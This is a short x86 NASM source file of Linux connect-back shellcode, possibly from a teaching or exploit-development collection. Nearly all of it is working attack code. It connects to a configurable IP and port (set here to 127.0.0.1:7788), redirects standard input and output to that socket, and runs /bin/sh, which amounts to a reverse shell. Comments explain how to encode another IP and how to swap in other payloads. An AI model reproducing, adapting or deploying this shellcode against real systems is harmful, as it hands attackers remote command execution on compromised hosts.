	;; Evan Jensen (wont) 021813
	;; Connect back shellcode
	;; Handy One liner for IP
	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
	;; port is littleEndian
%include "../include/short32.s"
	
%define IP dword 0x0100007f	;IP 127.0.0.1 Little Endian
%define PORT word  0x6c1e	;port 7788 Little Endian
	;; Socketcall is the systemcall we use to manipulate sockets
	;; It's linux specific. Use man socketcall.
	;; first argument is an integer and second is an arg struct ptr
BITS 32
	global main
main:
	xor eax,eax
	mov ebx,eax
	push eax
	push byte 1
	push byte 2
	inc ebx
	mov al,socketcall 
	mov ecx,esp
	int 0x80		;

	mov esi,eax
	xor eax,eax
	mov al,socketcall
	inc ebx
IPandPort:	
	push IP
	push PORT
	push bx 		;bx=2 AF_INET
	mov ecx,esp
	push byte 16
	push ecx
	push esi
	inc ebx			;ebx=3 connect()
	mov ecx,esp
	int 0x80

	mov edi,eax		;connect fd
	xor ecx,ecx
	mov eax,ecx
	mov edx,ecx
	mov cl,2
copy:
	mov al,dup2		;dup2 63
	int 0x80
	dec ecx
	jns copy
	
	;; Any local shellcode here
	;; 32bit execve /bin/sh below
	;; it's usually what you want
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov al, execve
	mov ebx,esp
	xor ecx,ecx
	mov edx,ecx
	int 0x80

	

	
